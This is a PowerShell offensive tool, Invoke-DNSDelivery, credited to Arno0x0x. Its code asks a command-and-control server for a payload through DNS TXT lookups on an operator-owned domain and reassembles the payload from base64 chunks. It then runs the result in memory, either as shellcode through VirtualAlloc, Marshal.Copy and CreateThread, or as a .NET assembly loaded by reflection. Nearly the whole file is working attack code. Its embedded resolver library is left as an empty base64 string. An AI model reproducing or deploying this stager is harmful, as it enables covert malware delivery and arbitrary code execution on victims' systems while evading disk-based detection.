function Invoke-DNSDelivery
{
	<#
	.SYNOPSIS
	Receive a shellcode or a .Net assembly over DNS resolution channel, then load it into memory and execute it.
	DNS TXT records are being used as a means of transportation of data.
	
	This script requires its server side counterpart (dnsdelivery.py) to communicate with and actually deliver the payload data.
    
	The system's DNS server is used by default, but you can specify a specific one if required.
	The only mandatory parameter is the domain name to be used for DNS resolution. This is the domain name you own, on which you must run the specific DNS server script mentioned above.

	Function: Invoke-DNSDelivery
	Author: Arno0x0x, Twitter: @Arno0x0x

	.EXAMPLE
    # Using the system's default DNS server
	PS C:\> Invoke-DNSDelivery -DomainName mydomain.example.com

    # Using a specific DNS server
    PS C:\> Invoke-DNSDelivery -DomainName mydomain.example.com -DNSServer 192.168.52.134

	#>
	
	[CmdletBinding(DefaultParameterSetName="main")]
		Param (

    	[Parameter(Mandatory = $True)]
    	[ValidateNotNullOrEmpty()]
    	[String]$DomainName = $( Read-Host "Enter domain name: " ),

        [Parameter(Mandatory = $False)]
        [String]$DNSServer
    )
	
	#------------------------------------------------------------------------------------------------------
	# DNS TXT type resolution is such a pain in the ass in powershell IF you want it to run on both Win7, Win8.x and Win10.
	# From Win8.1 onwards, you can use the Resolve-DnsName cmdlet which perfeclty does the trick. But for Win7 ?
	# For Windows 7, one option is to call a command line subprocess like "cmd /c nslookup -type=TXT xxx.domain.com" and then parse the output,
	# which can be tricky if there's multiple TXT records returned, plus it's not performant and not very portable, prone to errors on other languages OS etc...
	# Oh well... I just created a .Net library (dnsResolver.cs) which call Win32 API native functions, I load it here, and there you go, it's a little bit heavy but works everywhere
	
	# Load the DNS resolver library
	$DnsResolverLib = [System.Convert]::FromBase64String("")
	[System.Reflection.Assembly]::Load($DnsResolverLib) | Out-Null
	
	#------------------------------------------------------------------------------------------------------
	# Get data from the DNS server
	#------------------------------------------------------------------------------------------------------
	function Get-Data ([String]$Request)
	{
		$Response = New-Object -TypeName "System.Text.StringBuilder";
		$FQRequest = $Request + "." + $DomainName
		Write-Verbose "Sending request: $FQRequest to server [$DNSServer]"
		try {
			if ($DNSServer) {
				foreach ($TXTRecord in [DNSDelivery.DnsResolver]::GetTXTRecords($FQRequest, $DNSServer)) { $Response.Append($TXTRecord) | Out-Null }
			}
			else {
				foreach ($TXTRecord in [DNSDelivery.DnsResolver]::GetTXTRecords($FQRequest)) { $Response.Append($TXTRecord) | Out-Null }
			}
		}
		catch {
			Write-Verbose "[ERROR] Could not resolve $FQRequest, or could not contact DNS server"
			return $null
		}
		
		# Return the result
		$Response.ToString()
	}
	
	#------------------------------------------------------------------------------------------------------
	#Initialization step 
	# Contact the C2 over DNS channel, and ask what will be delivered:
	# - type of payload, can be a shellcode or a .Net assembly
	# - the number of chunks that constitute the payload
	
	# Contact the DNS C2 and perform initial request which is basically: "what do you have for me ?"
	$Init = Get-Data("init");
			
	if (!$Init) {
		# Error performing DNS request
		return
	}
	
	$Result = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Init)).Split('|')
	$Type = $Result[0]
	$NbChunk = [int]$Result[1]
	Write-Verbose "Type: $Type | Nb of chunks: $NbChunk"
	
	#------------------------------------------------------------------------------------------------------
	# At this stage we know how much chunks of data should be downloaded
	# Let's download all chunks of data and merge them
	
	$EncodedPayload = New-Object -TypeName "System.Text.StringBuilder";
	$i = 0;
	
	while ($i -lt $NbChunk)
	{
		$Request = $i -as [string];
		$Response = Get-Data($Request);
		if ($Response)
		{
			Write-Verbose "Received chunk $i"
			$EncodedPayload.Append($Response) | Out-Null
			$i++
		}
	}
	Write-Verbose "Whole data received"
	
	#------------------------------------------------------------------------------------------------------
	# Convert base64 data received back to byte array
	$Data = [System.Convert]::FromBase64String($EncodedPayload.ToString())
	
	#------------------------------------------------------------------------------------------------------
	# The data received is a shellcode
	if ($Type -eq "shellcode")
	{
		Write-Verbose "Invoking shellcode"
		function Get-NativeMethodHandle {
			Param ($DLLName, $MethodName)		
			$SystemAssembly = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
			return $SystemAssembly.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($SystemAssembly.GetMethod('GetModuleHandle')).Invoke($null, @($DLLName)))), $MethodName))
		}

		function Get-DelegateType {
			Param (
				[Parameter(Position = 0, Mandatory = $True)] [Type[]] $Parameters,
				[Parameter(Position = 1)] [Type] $ReturnType = [Void]
			)

			$TypeBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
			$TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters).SetImplementationFlags('Runtime, Managed')
			$TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters).SetImplementationFlags('Runtime, Managed')
			return $TypeBuilder.CreateType()
		}

		$FuncAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-NativeMethodHandle kernel32.dll VirtualAlloc), (Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $Data.Length,0x3000, 0x40)
		[System.Runtime.InteropServices.Marshal]::Copy($Data, 0, $FuncAddr, $Data.length)

		$ThreadHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-NativeMethodHandle kernel32.dll CreateThread), (Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$FuncAddr,[IntPtr]::Zero,0,[IntPtr]::Zero)
		[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-NativeMethodHandle kernel32.dll WaitForSingleObject), (Get-DelegateType @([IntPtr], [Int32]))).Invoke($ThreadHandle,0xffffffff) | Out-Null
	}
	
	#------------------------------------------------------------------------------------------------------
	# The data received is a .Net assembly
	elseif ($Type -eq "assembly")
	{
		Write-Verbose "Invoking .Net assembly"
		$Assembly = [System.Reflection.Assembly]::Load($Data)
		$Assembly.EntryPoint.Invoke($null, $null)
	}
}